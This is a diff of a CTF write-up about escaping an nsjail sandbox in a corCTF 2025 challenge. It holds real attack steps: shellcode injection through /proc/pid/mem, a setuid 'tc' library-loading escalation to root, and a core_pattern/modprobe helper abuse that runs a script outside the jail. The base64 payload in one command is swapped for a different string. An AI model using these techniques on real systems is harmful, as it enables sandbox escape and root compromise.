@@ -2,7 +2,7 @@
 
 was a pwn challenge from corCTF 2025 edition. A pretty hard challenge, it has only 3 solves at the end of the ctf.
 
-Actually I will more define it as pwn/misc challenge, than really hardcore binary exploitation, but it was still an interesting challenge.
+Actually, I will more define it as a pwn/misc challenge, than really hardcore binary exploitation, but it was still an interesting challenge.
 
 I worked on this challenge with my Water Paddler teammates lebr0nli, and nikhost.
 
@@ -10,7 +10,7 @@ I worked on this challenge with my Water Paddler teammates lebr0nli, and nikhost
 
 We were provided a qemu VM running a [nsjail][https://nsjail.dev/] linux system. So we are in a jail from which we have to escape.
 
-We have `user`rights when we land in the nsjail, and it's a read only filesystem. We can not create any files anywhere, even /tmp/ or /dev/shm/ (actually /dev directory is not mounted!) are impossible.
+We have `user`rights when we land in the nsjail, and it's a read only filesystem. We can not create any files anywhere, even `/tmp/` or `/dev/shm/` are impossible. (actually /dev directory is not mounted)
 
 Many actions were also restricted by nsjail configuration , so this is a very restrictive nsjail..
 
@@ -413,7 +413,7 @@ int main(int argc, char **argv) {
 
 the file include "shared.h" will contains the compiled shared library as a C include file.
 
-Here is the command to make the final `exploit2`:
+Here is the command to compile the final `exploit2`:
 
 ```shell
 gcc -shared -s -nostdlib -fPIC -o x.so exp.c && ls -al x.so && xxd -i x.so > shared.h && musl-gcc -Os -s -static exploit2.c -o exploit2 && ls -al exploit2
@@ -421,7 +421,7 @@ gcc -shared -s -nostdlib -fPIC -o x.so exp.c && ls -al x.so && xxd -i x.so > sha
 
 it compiles the shared library (exp.c), convert it to C include file, then compile with as a static binary the `exploit2` final privilege escalation exploit, ready to be uploaded by script.
 
-Good now we are root :=)
+Good now we are root !!! 🤪
 
 ```sh
 root ツ TCSystems:/proc/1# id
@@ -449,17 +449,47 @@ we will write a custom command in `/proc/sys/kernel/core_pattern` that will be e
 
 we will also write a simple script in the entry `/proc/sys/kernel/modprobe` which is another /proc entry writable.
 
-in `core_pattern`we will put the command `|/bin/busybox sh /proc/sys/kernel/modprobe`
+in `core_pattern`we will put the command: `|/bin/busybox sh /proc/sys/kernel/modprobe`
 
-that will excute the script in `/proc/sys/kernel/modprobe`.
+that will excute the script in: `/proc/sys/kernel/modprobe`.
 
 And in modprobe we will put this script:  `/bin/busybox cat /root/* > /proc/sys/kernel/modprobe`
 
-that will write the flag back in `/proc/sys/kernel/modprobe`
+that will write the flag back in: `/proc/sys/kernel/modprobe`
 
 then we just have to make a process crash, and that script will be executed outside the nsjail by kernel.
 
 We just have to read back the flag from `/proc/sys/kernel/modprobe` and it's done !!!
+
+**exploitation flowchart:**
+
+```shell
+         PAYLOAD TRANSFORMATIONS                          EXECUTION STAGES
+ ──────────────────────────────────────         ──────────────────────────────────────
+
+  SSH into jailed environment (RO FS)   ─────▶  [ Entry Point ]
+                                          
+  Shellcode written into /proc/[pid]/mem ─────▶  [ Stage 1 Injection ]
+                                          
+  Hex-encoded ELF payload                ─────▶  [ Stage 2 Loader ]
+  ↓ decoded → raw binary                        memfd_create + execveat
+                                                 → run decoded ELF in memory
+
+  Exploit2 ELF crafts TC_LIB_DIR path    ─────▶  [ Exploit2 ELF ]
+  pointing to /proc/.../fd                        prepares environment for tc
+
+  Attacker’s .so staged in memory        ─────▶  [ Privilege Escalation ]
+                                                 tc (setuid-root) dlopens attacker .so
+
+  .so constructor: setuid(0) + bash      ─────▶  [ Root Shell ]
+                                                 executes with root inside jail
+
+  Malicious script written for           ─────▶  [ Jail Escape ]
+  core_pattern / modprobe                         crash triggers kernel helper
+                                                 → execution outside jail
+                                                 → FLAG retrieved 🎉
+
+```
 
 
 
@@ -490,7 +520,7 @@ root ツ TCSystems:/proc/1# bash
 bash
 bash: cannot set terminal process group (1): Not a tty
 bash: no job control in this shell
-root ツ TCSystems:/proc/1# cd /proc/$$;read a<syscall;exec 3>mem;echo XHg0OFx4OGJceDAwXHg0OFx4OGJceDAwCg==|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
+root ツ TCSystems:/proc/1# cd /proc/$$;read a<syscall;exec 3>mem;echo Vm95ZWxsZXMgamUgZGlyYWkgcXVlbHF1ZSBqb3VyIHZvcyBuYWlzc2FuY2VzIGxhdGVudGVzLg==|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
 <==|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
 25+0 records in
 25+0 records out
